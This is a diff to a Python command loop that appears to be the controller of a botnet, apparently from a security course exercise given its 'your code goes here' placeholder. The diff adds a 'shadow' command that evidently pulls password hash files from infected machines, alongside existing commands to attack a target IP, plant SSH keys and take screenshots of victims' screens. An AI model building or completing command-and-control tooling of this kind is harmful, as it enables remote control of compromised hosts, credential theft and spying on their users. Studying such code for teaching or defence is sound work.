@@ -83,23 +83,38 @@ while True:
 		ip = input("Target IP? ")
 		send_cmd(cmd + " " + ip)
 		continue
+
 	elif cmd == "stop":
 		send_cmd("stop")
+
 	elif cmd == "ssh":
     	## TODO: generate a ssh key
+		## ---------------------------------
+		## your code goes here
 		key = "incorrect"
+		## ---------------------------------
 
 		send_cmd(cmd + " " + key)
 		continue
+
+	elif cmd == "shadow":
+		send_cmd("shadow")
+		continue
+
 	elif cmd == "ss" or cmd == "screenshot":
 		send_cmd("screenshot")
+		continue
+
 	elif cmd == "list":
 		print(bots)
 		continue
+
 	elif cmd == "update":
 		print("Fetching new connections and messages from bots")
+
 	elif cmd == "ping":
 		send_cmd("ping")
+
 	else:
 		print("Unknown command {}".format(cmd))
 		continue
